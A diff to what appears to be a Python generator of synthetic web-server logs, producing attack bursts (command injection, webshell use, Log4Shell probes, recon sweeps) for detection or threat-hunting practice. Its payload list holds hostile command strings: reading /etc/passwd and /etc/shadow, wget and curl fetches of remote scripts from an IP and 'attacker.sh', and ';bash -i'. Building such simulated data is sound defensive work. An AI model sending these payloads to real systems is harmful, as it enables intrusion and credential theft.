@@ -239,10 +239,11 @@ _ENCODED_XSS_PAYLOADS = [
 
 # Command injection payloads (percent-encoded)
 _ENCODED_CMD_PAYLOADS = [
-    "%3B+cat+%2Fetc%2Fpasswd",
-    "%7C+id",
-    "%26%26+whoami",
-    "%60id%60",
+    "cat+/etc/passwd",
+    ";wget+http://185.220.101.47/x.sh",
+    "|+curl+-s+http://attacker.sh",
+    ";bash+-i",
+    "cat+/etc/shadow",
 ]
 
 # --- NEW: Log4Shell (CVE-2021-44228) JNDI injection in User-Agent ---
@@ -443,7 +444,7 @@ def _generate_crawler_request(config):
 # THREAT GENERATOR
 # =============================================================================
 
-def _generate_attack_burst(config, session_context=None, forced_type=None):
+def _generate_attack_burst(config, session_context=None, forced_type=None, src_ip=None):
     """Generates a burst of threat logs.
 
     Attack types and their primary hunt approaches:
@@ -460,9 +461,13 @@ def _generate_attack_burst(config, session_context=None, forced_type=None):
       credential_stuffing — count_distinct(source_ip) on 401s to same login URL
       data_exfiltration   — sum(bytes_sent) by source_ip exceeds threshold
     """
-    attacker_ip = _random_external_ip()
+    # Honor a caller-provided source IP (e.g. a scenario attacker) so the whole
+    # burst shares one IP; otherwise use a random external IP.
+    attacker_ip = src_ip or _random_external_ip()
     user_agent  = _get_user_agent(config, event_type="threat")
-    burst_size  = random.randint(15, 25)
+    # recon_scan needs a high-volume single-IP sweep to trip the >=50 requests /
+    # >=15 distinct-paths detection; other attack types stay compact.
+    burst_size  = random.randint(55, 80) if forced_type == "recon_scan" else random.randint(15, 25)
     logs        = []
 
     if forced_type and forced_type in _ATTACK_TYPES:
@@ -533,7 +538,9 @@ def _generate_attack_burst(config, session_context=None, forced_type=None):
                 url = f"/comment.php?text={random.choice(_ENCODED_XSS_PAYLOADS)}"
             else:
                 url = f"/cgi-bin/process.cgi?cmd={random.choice(_ENCODED_CMD_PAYLOADS)}"
-            status_code = random.choice(["404", "400", "403"])
+            # Successful exploit delivery returns 200 (payload executed) or 500
+            # (server error from injection) — matches the payload-delivery rule.
+            status_code = random.choice(["200", "200", "500"])
             logs.append(_build_access_log_line(
                 config, attacker_ip, "GET", url, status_code, user_agent, "-", 412))
 
@@ -557,9 +564,12 @@ def _generate_attack_burst(config, session_context=None, forced_type=None):
                     config, attacker_ip, "POST", ws_upload_endpoint, "200",
                     user_agent, "-", random.randint(150, 400)))
             else:
+                # Vary the shell path per execute event so the burst hits multiple
+                # distinct /uploads/*.php paths (detection needs distinct_paths >= 2).
+                shell_path = random.choice(_WEBSHELL_PATHS)
                 referer = f"http://{ws_server_name}{ws_upload_endpoint}"
                 logs.append(_build_access_log_line(
-                    config, attacker_ip, "POST", ws_shell_path, "200",
+                    config, attacker_ip, "POST", shell_path, "200",
                     user_agent, referer, random.randint(20, 450)))
 
         elif attack_type == "log4shell_probe":
@@ -664,7 +674,8 @@ def generate_log(config, scenario=None, threat_level="Realistic",
     # --- Specific threat forced dispatch ---
     if scenario_event and scenario_event in _ATTACK_TYPES:
         last_threat_event_time = time.time()
-        return _generate_attack_burst(config, session_context, forced_type=scenario_event)
+        return _generate_attack_burst(config, session_context, forced_type=scenario_event,
+                                      src_ip=(context or {}).get('src_ip'))
 
     # --- Threat generation (skipped entirely when benign_only=True) ---
     if not benign_only:
